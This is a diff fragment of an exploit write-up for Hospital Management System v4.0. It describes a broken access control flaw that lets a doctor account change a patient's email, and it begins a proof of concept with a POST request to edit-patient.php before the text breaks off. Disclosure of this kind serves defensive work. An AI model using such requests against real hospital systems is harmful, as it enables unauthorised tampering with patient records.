@@ -7,7 +7,7 @@
 ## Exploit Description:
 ## Hospital Management System v4.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attacker doctor to update the email of patient that cannot modify in UI.
 
-## -----------------------------------------------POC-------------------------------------------------------------------
+## ---------------------------------POC-----------------------------
 ```
 POST /hospital/hms/doctor/edit-patient.php?editid=2 HTTP/1.1
 ...
